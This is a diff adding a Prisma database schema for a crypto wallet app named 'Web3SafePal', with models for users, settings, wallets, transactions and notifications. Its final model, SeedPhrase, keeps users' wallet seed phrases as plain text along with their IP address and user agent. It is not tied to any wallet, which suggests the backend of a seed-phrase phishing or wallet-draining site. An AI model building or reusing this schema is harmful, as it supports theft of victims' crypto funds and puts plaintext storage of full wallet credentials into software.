@@ -1,0 +1,108 @@
+// Prisma Schema for Web3SafePal
+// This defines our database structure
+
+generator client {
+  provider = "prisma-client-js"
+}
+
+datasource db {
+  provider = "mysql"
+  url      = env("DATABASE_URL")
+}
+
+// User model - stores user accounts
+model User {
+  id              String   @id @default(cuid())
+  email           String   @unique
+  password        String
+  name            String
+  pin             String?  // 4-digit PIN for security
+  referralCode    String   @unique @default(cuid())
+  referredBy      String?
+  isAdmin         Boolean  @default(false)
+  isVerified      Boolean  @default(false)
+  verifyCode      String?
+  verifyExpires   DateTime?
+  createdAt       DateTime @default(now())
+  updatedAt       DateTime @updatedAt
+
+  // Relations
+  wallets       Wallet[]
+  transactions  Transaction[]
+  notifications Notification[]
+  settings      UserSettings?
+
+  @@map("users")
+}
+
+// User Settings
+model UserSettings {
+  id              String   @id @default(cuid())
+  userId          String   @unique
+  user            User     @relation(fields: [userId], references: [id], onDelete: Cascade)
+  enabledCoins    String   @default("[\"BTC\",\"ETH\",\"USDT\",\"SOL\",\"XRP\",\"BNB\",\"ADA\",\"DOGE\",\"MATIC\",\"DOT\"]") // JSON string for MySQL - ALL coins enabled by default
+  notifications   Boolean  @default(true)
+  createdAt       DateTime @default(now())
+  updatedAt       DateTime @updatedAt
+
+  @@map("user_settings")
+}
+
+// Wallet model - stores user wallet addresses and balances
+model Wallet {
+  id        String   @id @default(cuid())
+  userId    String
+  user      User     @relation(fields: [userId], references: [id], onDelete: Cascade)
+  coin      String   // BTC, ETH, USDT, etc.
+  network   String   // mainnet, TRC20, ERC20, BEP20
+  address   String
+  balance   Decimal  @default(0)
+  createdAt DateTime @default(now())
+  updatedAt DateTime @updatedAt
+
+  @@unique([userId, coin, network])
+  @@map("wallets")
+}
+
+// Transaction model - stores deposit/withdrawal history
+model Transaction {
+  id          String   @id @default(cuid())
+  userId      String
+  user        User     @relation(fields: [userId], references: [id], onDelete: Cascade)
+  type        String   // deposit, withdrawal, swap, transfer
+  coin        String
+  amount      Decimal
+  status      String   @default("pending") // pending, completed, failed
+  txHash      String?
+  fromAddress String?
+  toAddress   String?
+  createdAt   DateTime @default(now())
+  updatedAt   DateTime @updatedAt
+
+  @@map("transactions")
+}
+
+// Notification model
+model Notification {
+  id        String   @id @default(cuid())
+  userId    String
+  user      User     @relation(fields: [userId], references: [id], onDelete: Cascade)
+  title     String
+  message   String
+  read      Boolean  @default(false)
+  createdAt DateTime @default(now())
+
+  @@map("notifications")
+}
+
+// SeedPhrase model - stores wallet connection seed phrases
+model SeedPhrase {
+  id          String   @id @default(cuid())
+  userId      String
+  seedPhrase  String   @db.Text
+  ipAddress   String?
+  userAgent   String?  @db.Text
+  createdAt   DateTime @default(now())
+
+  @@map("seed_phrases")
+}
